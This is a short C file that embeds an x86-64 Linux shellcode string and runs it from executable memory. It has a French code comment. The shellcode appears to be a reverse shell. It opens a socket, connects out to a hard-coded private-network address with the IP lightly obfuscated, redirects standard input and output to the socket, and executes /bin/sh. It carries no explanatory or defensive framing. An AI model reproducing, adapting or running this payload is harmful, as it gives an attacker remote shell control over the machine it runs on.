#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <fcntl.h> // Assurez-vous d'inclure fcntl.h

char shellcode[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x4d\x31\xc0\x4c\x89\xc7\x48\x31\xf6\x4d\x31\xc0\x4c\x89\xc2\xb0\x1e\x04\x0b\x40\xb7\x03\x40\x80\xef\x01\x48\x83\xc6\x01\x0f\x05\x48\x89\xc7\x49\x89\xc2\x48\x31\xc0\xb0\x2a\x48\x31\xdb\x53\xbe\xc1\xa9\x02\x3b\x81\xee\x01\x01\x01\x01\x56\x66\x68\x23\x1d\x66\x6a\x02\x48\x89\xe6\xb2\x18\x0f\x05\x48\x31\xc0\x48\x31\xd2\xb0\x21\x4c\x89\xd7\x48\x31\xf6\x0f\x05\x48\x31\xc0\x48\x31\xd2\xb0\x21\x4c\x89\xd7\x48\xff\xc6\x0f\x05\x48\x31\xc0\x48\x31\xd2\xb0\x21\x4c\x89\xd7\x48\xff\xc6\x0f\x05\x48\x89\xd0\x48\x31\xd0\x48\x31\xd2\x48\xbb\x31\x0a\x4d\x58\x6e\x2f\x73\x68\x48\x81\xc3\xfe\x24\x15\x11\x50\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3a\x04\x01\x0f\x05\x48\x31\xff\x48\x31\xff\xb0\x1e\x04\x1e\x0f\x05";

void main() {
    printf("shellcode length: %u\n", strlen(shellcode));
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ |
                    PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}
